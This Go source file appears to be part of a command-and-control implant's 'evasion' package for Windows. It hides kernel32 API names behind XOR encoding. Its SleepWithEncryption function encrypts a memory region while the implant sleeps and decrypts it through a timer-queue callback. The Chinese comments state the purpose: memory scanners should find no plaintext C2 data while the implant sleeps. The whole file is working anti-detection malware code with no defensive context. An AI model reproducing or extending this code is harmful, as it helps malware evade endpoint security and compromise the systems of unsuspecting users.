//go:build windows

package evasion

import (
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// encK32 = kernel32.dll XOR 0x7F
var encK32Sleep = []byte{0x14, 0x1A, 0x0D, 0x11, 0x1A, 0x13, 0x4C, 0x4D, 0x51, 0x1B, 0x13, 0x13}

// 加密的API名 (XOR 0x7F)
var (
	encCTQT    = []byte{0x3C, 0x0D, 0x1A, 0x1E, 0x0B, 0x1A, 0x2B, 0x16, 0x12, 0x1A, 0x0D, 0x2E, 0x0A, 0x1A, 0x0A, 0x1A, 0x2B, 0x16, 0x12, 0x1A, 0x0D} // CreateTimerQueueTimer
	encWFSO    = []byte{0x28, 0x1E, 0x16, 0x0B, 0x39, 0x10, 0x0D, 0x2C, 0x16, 0x11, 0x18, 0x13, 0x1A, 0x30, 0x1D, 0x15, 0x1A, 0x1C, 0x0B}                         // WaitForSingleObject
	encCTE     = []byte{0x3C, 0x0D, 0x1A, 0x1E, 0x0B, 0x1A, 0x3A, 0x09, 0x1A, 0x11, 0x0B}                                                                           // CreateEvent
)

var (
	sleepEncKey   byte
	sleepDataPtr  unsafe.Pointer
	sleepDataLen  uintptr
	sleepWoken    uint32
)

// SleepWithEncryption 加密敏感数据、用Timer Queue替代Sleep
// 原理：Sleep期间加密内存 → 定时器唤醒 → 解密 → 恢复执行
// 这样内存扫描器在Sleep窗口内找不到明文C2数据
func SleepWithEncryption(d time.Duration, dataPtr unsafe.Pointer, dataLen uintptr, encKey byte) {
	if dataPtr == nil || dataLen == 0 {
		time.Sleep(d)
		return
	}

	// 1. 加密内存
	sleepEncKey = encKey
	sleepDataPtr = dataPtr
	sleepDataLen = dataLen
	atomic.StoreUint32(&sleepWoken, 0)

	data := unsafe.Slice((*byte)(dataPtr), dataLen)
	for i := range data {
		data[i] ^= encKey
	}

	// 2. 创建Timer Queue定时器唤醒
	k32 := windows.NewLazySystemDLL(xorDec(encK32Sleep, xk))
	createTimerQueueTimer := k32.NewProc(xorDec(encCTQT, xk))
	waitForSingleObject := k32.NewProc(xorDec(encWFSO, xk))

	// 创建唤醒事件
	createEvent := k32.NewProc(xorDec(encCTE, xk))
	event, _, _ := createEvent.Call(0, 0, 0, 0)

	// 唤醒回调：解密内存 + 设置事件
	callback := windows.NewCallback(func(param uintptr, timerOrWaitFired byte) uintptr {
		d := unsafe.Slice((*byte)(sleepDataPtr), sleepDataLen)
		for i := range d {
			d[i] ^= sleepEncKey
		}
		windows.SetEvent(windows.Handle(event))
		atomic.StoreUint32(&sleepWoken, 1)
		return 0
	})

	var timer uintptr
	createTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&timer)),
		0, // 默认队列
		callback,
		0,
		uintptr(d.Milliseconds()),
		0,
		0, // WT_EXECUTEDEFAULT
	)

	// 3. 等待唤醒事件（阻塞直到定时器触发）
	waitForSingleObject.Call(event, 0xFFFFFFFF)
	windows.CloseHandle(windows.Handle(event))
}
